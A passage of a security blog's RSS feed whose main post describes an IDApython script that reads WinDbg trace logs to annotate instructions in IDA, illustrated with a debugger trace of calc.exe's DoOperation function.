Enjoy!&lt;/div&gt;&lt;div style="text-align: justify;"&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style="text-align: justify;"&gt;References:&lt;br /&gt;&lt;br /&gt;&lt;a name="4_1"&gt;&lt;/a&gt;1. Berend-Jan "SkyLined" Wever, w32-exec-calc-shellcode, &lt;a href="http://code.google.com/p/w32-exec-calc-shellcode/"&gt;http://code.google.com/p/w32-exec-calc-shellcode/&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;&lt;a name="4_2"&gt;&lt;/a&gt;2. Matt Miller, "Understanding Windows Shellcode", December 6, 2003, &lt;a href="http://www.hick.org/code/skape/papers/win32-shellcode.pdf"&gt;http://www.hick.org/code/skape/papers/win32-shellcode.pdf&lt;/a&gt; &lt;/div&gt;&lt;div class="blogger-post-footer"&gt;&lt;img alt="" height="1" src="https://blogger.googleusercontent.com/tracker/6052198192158185644-282741896559422533?l=exploit-monday.com" width="1" /&gt;&lt;/div&gt;</description><pubDate>Wed, 20 Jul 2011 13:27:00 +0000</pubDate></item><item><title>Integrating WinDbg and IDA for Improved Code Flow Analysis</title><link>http://www.exploit-monday.com/2011/07/integrating-windbg-and-ida-for-improved.html</link><description>&lt;div style="text-align: justify;"&gt;IDA is hands down the best tool for static analysis. Its debugger on the other hand, when compared to the power of WinDbg is certainly lacking, IMHO. As such, I find myself wasting too much time switching between windows and manually highlighting and commenting instructions in IDA as I trace through them in WinDbg. Fortunately, the power of IDApython can be unleashed to reduce this tedium.&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;I was reading an older TippingPoint MindshaRE article from Cody Pierce entitled “Hit Tracing in WinDbg[&lt;a href="http://www.exploit-monday.com/feeds/posts/default#5_1"&gt;1&lt;/a&gt;]” and was inspired by his ideas to implement my own IDApython script to better integrate WinDbg with IDA. While, I may be recreating many of his efforts, my primary intent was to get better at scripting in IDApython while improving upon my static/dynamic analysis workflow.&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;The purpose of my script is to parse WinDbg log files for module base addresses, instruction addresses, references to register values, and pointer dereferences. Then, for every instruction you hit in your debug session, the corresponding instructions will be colored and commented accordingly and in a module base address-agnostic fashion.&lt;/div&gt;&lt;br /&gt;To get started, your WinDbg log file will need to display the following:&lt;br /&gt;&lt;br /&gt;• Disassembly of current instruction&lt;br /&gt;• Effective address for current instruction&lt;br /&gt;• Register state&lt;br /&gt;• Listing of loaded modules (optional, but highly recommended)&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;The first three items should be enabled by default but can be re-enabled with the ‘.prompt_allow’ command. Your output should look like the following:&lt;/div&gt;&lt;br /&gt;&lt;div&gt;eax=003762f8 ebx=006cc278 ecx=00000004 edx=00000000 esi=006cc420 edi=00000001&lt;/div&gt;&lt;div&gt;eip=00491469 esp=0020e348 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;/div&gt;&lt;div&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;/div&gt;&lt;div&gt;calc!CCalcEngine::DoOperation+0x6be:&lt;/div&gt;&lt;div&gt;00491469 e8074efeff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!divrat (00476275)&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;The reason it is ideal to include module base addresses in your log file is so that effective addresses can be calculated as offsets then added to the base address of the module in IDA. This helps because the module base address in WinDbg is often different than the base address in IDA. Also, this avoids having to modify the dumpfile to match IDA or rebase the addresses in IDA – both, a pain and unnecessary. My script parses the output of ‘lmp’ in WinDbg which outputs the base addresses of loaded modules minus symbol information.&lt;/div&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;To continue riding Cody’s coattails, I’ll be analyzing the DoOperation function (0x00495001-0x00495051) in calc.exe as he did. I determined the beginning and ending addresses of the function with the following commands:&lt;/div&gt;&lt;br /&gt;&lt;div&gt;0:000&amp;gt; X calc!*DoOperation*&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;/div&gt;&lt;div class="separator" style="clear: both; text-align: center;"&gt;&lt;/div&gt;&lt;b style="color: red;"&gt;&lt;span&gt;00495001 calc!CCalcEngine::DoOperation = &lt;/span&gt;&lt;/b&gt;&lt;br /&gt;&lt;span&gt; 0:000&amp;gt; BP 00495001&lt;/span&gt;&lt;br /&gt;&lt;span&gt; 0:000&amp;gt; g&lt;/span&gt;&lt;br /&gt;&lt;br /&gt;Entering in 1000 / 4 in calc&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;&lt;div style="text-align: justify;"&gt; &lt;span&gt;Breakpoint 0 hit&lt;/span&gt;&lt;br /&gt;&lt;span&gt; eax=00439220 ebx=0069c420 ecx=0069c278 edx=00000000 esi=0069c278 edi=00000000&lt;/span&gt;&lt;br /&gt;&lt;span&gt; eip=00495001 esp=0032e95c ebp=0032ea4c iopl=0         nv up ei pl nz na pe nc&lt;/span&gt;&lt;br /&gt;&lt;span&gt; cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206&lt;/span&gt;&lt;br /&gt;&lt;span&gt; calc!CCalcEngine::DoOperation:&lt;/span&gt;&lt;br /&gt;&lt;span&gt; 00495001 6a1c            push    1Ch&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; &lt;br /&gt;Step through function until return instruction&lt;br /&gt;&lt;br /&gt;&lt;div style="text-align: justify;"&gt;&lt;div style="text-align: justify;"&gt; &lt;span&gt;0:000&amp;gt; PT&lt;/span&gt;&lt;br /&gt;&lt;span&gt; eax=00000000 ebx=0069c420 ecx=00495051 edx=00445310 esi=0069c278 edi=00000000&lt;/span&gt;&lt;br /&gt;&lt;span&gt; eip=00495051 esp=0032e95c ebp=0032ea4c iopl=0         nv up ei pl zr na pe nc&lt;/span&gt;&lt;br /&gt;&lt;span&gt; cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246&lt;/span&gt;&lt;br /&gt;&lt;span&gt; calc!CCalcEngine::DoOperation+0xfa:&lt;/span&gt;&lt;br /&gt;&lt;span&gt; &lt;b style="color: red;"&gt;00495051 c20c00          ret     0Ch&lt;/b&gt;&lt;/span&gt;&lt;br /&gt;&lt;span&gt; 0:000&amp;gt; g&lt;/span&gt;&lt;br /&gt;&lt;span&gt; 0:004&amp;gt; .logopen "calc.log"&lt;/span&gt;&lt;/div&gt;&lt;/div&gt; &lt;br /&gt;The following dump is the result of the operation 1000/4 in the function without stepping into calls (using the PA command):&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;&lt;textarea readonly="readonly" rows="15" wrap="off"&gt;Opened log file 'calc.log'&lt;br /&gt;0:004&amp;gt; lmp&lt;br /&gt;start&amp;nbsp;&amp;nbsp;&amp;nbsp; end&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; module name&lt;br /&gt;00470000 00530000&amp;nbsp;&amp;nbsp; calc&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;66580000 665bc000&amp;nbsp;&amp;nbsp; oleacc&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;73710000 73742000&amp;nbsp;&amp;nbsp; WINMM&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;739e0000 73adb000&amp;nbsp;&amp;nbsp; WindowsCodecs &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;73ae0000 73af3000&amp;nbsp;&amp;nbsp; dwmapi&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;73ca0000 73e30000&amp;nbsp;&amp;nbsp; gdiplus&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;73e30000 73e70000&amp;nbsp;&amp;nbsp; UxTheme&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;73ed0000 7406e000&amp;nbsp;&amp;nbsp; COMCTL32 &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;75290000 75299000&amp;nbsp;&amp;nbsp; VERSION&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;75d10000 75d1c000&amp;nbsp;&amp;nbsp; CRYPTBASE &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;75f30000 75f7a000&amp;nbsp;&amp;nbsp; KERNELBASE &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76090000 760e7000&amp;nbsp;&amp;nbsp; SHLWAPI&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;760f0000 761c4000&amp;nbsp;&amp;nbsp; kernel32 &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76210000 76293000&amp;nbsp;&amp;nbsp; CLBCatQ&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;762b0000 7637c000&amp;nbsp;&amp;nbsp; MSCTF&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76380000 763ce000&amp;nbsp;&amp;nbsp; GDI32&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76460000 76479000&amp;nbsp;&amp;nbsp; sechost&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76690000 76731000&amp;nbsp;&amp;nbsp; RPCRT4&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76740000 76809000&amp;nbsp;&amp;nbsp; USER32&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76810000 768bc000&amp;nbsp;&amp;nbsp; msvcrt&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;768c0000 76a1c000&amp;nbsp;&amp;nbsp; ole32&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76a20000 76aaf000&amp;nbsp;&amp;nbsp; OLEAUT32 &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76f00000 76f9d000&amp;nbsp;&amp;nbsp; USP10&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;76fa0000 77bea000&amp;nbsp;&amp;nbsp; SHELL32&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;77bf0000 77d2c000&amp;nbsp;&amp;nbsp; ntdll&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;77d30000 77d3a000&amp;nbsp;&amp;nbsp; LPK&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;77d60000 77e00000&amp;nbsp;&amp;nbsp; ADVAPI32 &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;77e00000 77e1f000&amp;nbsp;&amp;nbsp; IMM32&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;none&amp;gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &lt;br /&gt;&lt;br /&gt;Unloaded modules:&lt;br /&gt;6d580000 6d59a000&amp;nbsp;&amp;nbsp; mzvkbd3.dll&lt;br /&gt;77d50000 77d55000&amp;nbsp;&amp;nbsp; PSAPI.DLL&lt;br /&gt;0:004&amp;gt; g&lt;br /&gt;Breakpoint 0 hit&lt;br /&gt;eax=00384b90 ebx=006cc420 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495001 esp=0020e38c ebp=0020e47c iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation:&lt;br /&gt;00495001 6a1c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; push&amp;nbsp;&amp;nbsp;&amp;nbsp; 1Ch&lt;br /&gt;0:000&amp;gt; pa 00495051&lt;br /&gt;eax=00384b90 ebx=006cc420 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495003 esp=0020e388 ebp=0020e47c iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x2:&lt;br /&gt;00495003 b8e1f74b00&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; eax,offset calc!_allmul+0x2038 (004bf7e1)&lt;br /&gt;eax=004bf7e1 ebx=006cc420 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495008 esp=0020e388 ebp=0020e47c iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x7:&lt;br /&gt;00495008 e89ed2fdff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; call&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!operator new+0x30 (004722ab)&lt;br /&gt;eax=0020e37c ebx=006cc420 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=0049500d esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000286&lt;br /&gt;calc!CCalcEngine::DoOperation+0xc:&lt;br /&gt;0049500d 8bd9&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ebx,ecx&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=0049500f esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000286&lt;br /&gt;calc!CCalcEngine::DoOperation+0xe:&lt;br /&gt;0049500f 895ddc&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-24h],ebx ss:0023:0020e364=00000000&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495012 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei ng nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000286&lt;br /&gt;calc!CCalcEngine::DoOperation+0x11:&lt;br /&gt;00495012 33ff&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; xor&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; edi,edi&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495014 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl zr na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000246&lt;br /&gt;calc!CCalcEngine::DoOperation+0x13:&lt;br /&gt;00495014 837d0856&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+8],56h ss:0023:0020e390=0000005b&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495018 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x17:&lt;br /&gt;00495018 897dec&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-14h],edi ss:0023:0020e374={KERNELBASE!_except_handler4 (75f51425)}&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=0049501b esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x1a:&lt;br /&gt;0049501b 897dfc&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp-4],edi ss:0023:0020e384=ffffffff&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=0049501e esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x1d:&lt;br /&gt;0049501e 7c0a&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; jl&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0xd3 (0049502a) [br=0]&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495020 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na pe nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000206&lt;br /&gt;calc!CCalcEngine::DoOperation+0x23:&lt;br /&gt;00495020 837d085a&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cmp&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; dword ptr [ebp+8],5Ah ss:0023:0020e390=0000005b&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=00495024 esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0x27:&lt;br /&gt;00495024 0f8e20f9ffff&amp;nbsp;&amp;nbsp;&amp;nbsp; jle&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; calc!CCalcEngine::DoOperation+0x2d (0049494a) [br=0]&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc278 edi=00000000&lt;br /&gt;eip=0049502a esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br /&gt;calc!CCalcEngine::DoOperation+0xd3:&lt;br /&gt;0049502a 8b750c&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; mov&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; esi,dword ptr [ebp+0Ch] ss:0023:0020e394=006cc420&lt;br /&gt;eax=0020e37c ebx=006cc278 ecx=006cc278 edx=00000000 esi=006cc420 edi=00000000&lt;br /&gt;eip=0049502d esp=0020e350 ebp=0020e388 iopl=0&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; nv up ei pl nz na po nc&lt;br /&gt;cs=001b&amp;nbsp; ss=0023&amp;nbsp; ds=0023&amp;nbsp; es=0023&amp;nbsp; fs=003b&amp;nbsp; gs=0000&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; efl=00000202&lt;br 